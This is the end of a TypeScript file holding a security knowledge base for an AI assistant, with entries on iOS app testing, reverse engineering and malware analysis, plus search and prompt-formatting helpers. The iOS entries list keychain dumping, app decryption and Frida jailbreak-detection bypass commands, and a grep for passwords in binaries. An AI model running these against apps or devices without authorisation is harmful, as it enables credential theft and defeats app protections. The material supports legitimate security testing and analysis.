    commands: [
      'frida-ps -Uai',
      'objection --gadget analyze explore',
      'clutch -d com.target.app',
      'class-dump Target.app/Target',
      'keychain_dump',
      'frida -U -f com.target.app -l ios_bypass.js',
    ],
    examples: [
      'List running apps: frida-ps -Uai',
      'Decrypt app: clutch -d com.target.app',
      'Frida jailbreak bypass: frida -U -f com.target.app -l jailbreak_bypass.js --no-pause',
    ],
    relatedTools: ['frida', 'objection', 'clutch', 'flexdecrypt', 'class-dump'],
  },
  // ── REVERSE ENGINEERING ──
  {
    id: 'reverse-engineering',
    title: 'Reverse Engineering and Binary Analysis',
    category: 'reverse-engineering',
    content: `Reverse engineering (RE) decomposes software to understand its internals.

Disassemblers/Decompilers:
- Ghidra: NSA's free RE suite (disassembly + decompilation)
- IDA Pro: Industry standard disassembler
- Binary Ninja: Modern RE platform
- Radare2/rizin: Open-source RE framework
- Cutter: GUI for radare2

Dynamic analysis:
- GDB: GNU debugger (Linux)
- WinDbg: Windows debugger
- x64dbg: Windows user-mode debugger
- lldb: LLVM debugger (macOS/iOS)
- strace/ltrace: System/library call tracing
- Process Monitor (ProcMon): Windows file/registry/network monitor

Binary format analysis:
- PE files: Windows executables (PE header, imports, sections)
- ELF files: Linux executables
- Mach-O: macOS executables
- APK/IPA: Mobile app packages (zip-based)

Key techniques:
- Function identification and naming
- Control flow graph analysis
- String extraction and cross-references
- Import/export table analysis
- Patching and binary modification
- Anti-analysis detection (VM, debugger, unpacking)
- Cryptographic algorithm identification
- Protocol reverse engineering
- Malware analysis workflow

Workflow:
1. Run file, strings, and basic recon
2. Load into disassembler
3. Identify main function and key data structures
4. Trace execution flow dynamically
5. Document findings and rename functions
6. Patch or recreate functionality`,
    tags: ['reverse', 'engineering', 'ghidra', 'ida', 'debug', 'binary', 'disassemble', 'malware', 'analyze'],
    commands: [
      'ghidra HEADLESS project_dir script_dir',
      'r2 -A binary',
      'strings binary | grep -i password',
      'objdump -d binary',
      'readelf -a binary',
      'gdb ./binary',
      'ltrace ./binary',
      'strace ./binary',
      'file binary',
      'binwalk -e firmware.bin',
    ],
    examples: [
      'Quick recon: file binary && strings binary | head -50 && objdump -d binary | head -100',
      'Ghidra headless analysis: analyzeHeadless /project /ghidra_project -import binary -postScript AnalyzeScript.java',
      'Radare2 analysis: r2 -A -c "aaa; afl; pdf @main" binary',
      'Firmware extraction: binwalk -e firmware.bin',
      'GDB analysis: gdb -q ./binary -ex "break main" -ex "run" -ex "disassemble main"',
    ],
    relatedTools: ['ghidra', 'ida', 'radare2', 'gdb', 'x64dbg', 'cutter', 'binwalk'],
  },
  {
    id: 'malware-analysis',
    title: 'Malware Analysis and Reverse Engineering',
    category: 'reverse-engineering',
    content: `Malware analysis combines static and dynamic techniques to understand malicious software.

Static analysis:
- YARA rules: Pattern matching for malware classification
- PEStudio: Quick static analysis of PE files
- FLOSS: Extract obfuscated strings
- Detect It Easy (DIE): Identify compiler, packer, crypto
- ExeInfo PE: PE information and unpacking hints
- PE-bear: PE file viewer/editor

Dynamic analysis:
- Cuckoo Sandbox: Automated malware analysis
- ANY.RUN: Interactive online sandbox
- REMnux: Linux malware analysis distro
- FlareVM: Windows malware analysis VM
- Process Monitor: File/registry/process monitoring
- Process Hacker: Advanced process analysis
- Wireshark: Network traffic capture
- FakeNet-NG: Network simulation for analysis

Unpacking:
- UPX: Universal unpacker
- ESET Unpacker
- Generic unpacking with debugger breakpoints
- Custom scripts for custom packers

Workflow:
1. Create isolated analysis VM (no internet)
2. Run static recon (file, strings, DIE, PEStudio)
3. Identify packer/obfuscation -> unpack if needed
4. Run in sandbox, capture network/process behavior
5. Analyze with debugger if needed
6. Extract IOCs (domains, IPs, file hashes, mutexes)
7. Write YARA rules for detection`,
    tags: ['malware', 'yara', 'cuckoo', 'sandbox', 'unpack', 'analysis', 'virus', 'trojan', 'obfuscate'],
    commands: [
      'yara -r rules.yar target.exe',
      'floss target.exe',
      'upx -d packed.exe',
      'strings -a target.exe | grep -E "(http|\\.exe|\\.dll)"',
      'cuckoo submit target.exe',
      'capa target.exe',
    ],
    examples: [
      'Quick static: file target.exe && strings -a target.exe | head -100',
      'Unpack UPX: upx -d packed.exe',
      'YARA scan: yara -r malware_rules.yar /path/to/samples/',
      'Capability detection: capa target.exe',
      'FLOSS strings: floss target.exe',
    ],
    relatedTools: ['yara', 'cuckoo', 'floss', 'pestudio', 'flarevm', 'remnux', 'capa'],
  },
];

// ═══════════════════════════════════════════════════════════════
// SEARCH ENGINE — TF-IDF-like relevance scoring
// ═══════════════════════════════════════════════════════════════

/**
 * Search the knowledge base for relevant entries
 * Returns scored results sorted by relevance
 */
export function searchKnowledge(
  query: string,
  maxResults: number = 5,
  categoryFilter?: string
): (KnowledgeEntry & { score: number })[] {
  const queryTerms = tokenize(query);
  if (queryTerms.length === 0) return [];

  const results: (KnowledgeEntry & { score: number })[] = [];

  for (const entry of KNOWLEDGE_DB) {
    // Apply category filter
    if (categoryFilter && entry.category !== categoryFilter) continue;

    let score = 0;
    const titleTokens = tokenize(entry.title);
    const tagTokens = entry.tags.map(t => t.toLowerCase());
    const contentTokens = tokenize(entry.content);
    const cmdTokens = entry.commands.join(' ').toLowerCase();

    // Title match (highest weight)
    for (const qt of queryTerms) {
      for (const tt of titleTokens) {
        if (tt === qt) score += 10;
        else if (tt.includes(qt) || qt.includes(tt)) score += 5;
      }
    }

    // Tag match (high weight)
    for (const qt of queryTerms) {
      for (const tag of tagTokens) {
        if (tag === qt) score += 8;
        else if (tag.includes(qt) || qt.includes(tag)) score += 4;
      }
    }

    // Command match
    for (const qt of queryTerms) {
      if (cmdTokens.includes(qt)) score += 3;
    }

    // Content match (lower weight, penalize length)
    for (const qt of queryTerms) {
      for (const ct of contentTokens) {
        if (ct === qt) score += 1;
        else if (ct.includes(qt)) score += 0.5;
      }
    }

    // Multi-term bonus: if multiple query terms match
    const matchedTerms = queryTerms.filter(qt =>
      entry.tags.some(t => t.includes(qt)) ||
      entry.title.toLowerCase().includes(qt) ||
      entry.content.toLowerCase().includes(qt)
    );
    if (matchedTerms.length > 1) {
      score *= (1 + matchedTerms.length * 0.2);
    }

    if (score > 0) {
      results.push({ ...entry, score });
    }
  }

  return results
    .sort((a, b) => b.score - a.score)
    .slice(0, maxResults);
}

/**
 * Get all available categories
 */
export function getCategories(): string[] {
  return [...new Set(KNOWLEDGE_DB.map(e => e.category))];
}

/**
 * Get knowledge entries by category
 */
export function getByCategory(category: string): KnowledgeEntry[] {
  return KNOWLEDGE_DB.filter(e => e.category === category);
}

/**
 * Format knowledge entry for injection into AI prompt
 */
export function formatForPrompt(entry: KnowledgeEntry): string {
  let formatted = `## ${entry.title}\n`;
  formatted += `Category: ${entry.category}\n\n`;
  formatted += entry.content + '\n';
  if (entry.commands.length > 0) {
    formatted += '\n### Commands:\n';
    entry.commands.forEach(c => { formatted += `- \`${c}\`\n`; });
  }
  if (entry.examples.length > 0) {
    formatted += '\n### Examples:\n';
    entry.examples.forEach(e => { formatted += `- ${e}\n`; });
  }
  return formatted;
}

// ── Helpers ──

function tokenize(text: string): string[] {
  return text
    .toLowerCase()
    .replace(/[^a-z0-9\s+#.-]/g, ' ')
    .split(/\s+/)
    .filter(t => t.length > 1);
}

/**
 * Get stats about the knowledge base
 */
export function getKnowledgeStats() {
  const categories = getCategories();
  const totalCommands = KNOWLEDGE_DB.reduce((sum, e) => sum + e.commands.length, 0);
  const totalExamples = KNOWLEDGE_DB.reduce((sum, e) => sum + e.examples.length, 0);
  return {
    totalEntries: KNOWLEDGE_DB.length,
    categories: categories.length,
    categoryList: categories,
    totalCommands,
    totalExamples,
    totalTags: new Set(KNOWLEDGE_DB.flatMap(e => e.tags)).size,
  };
}
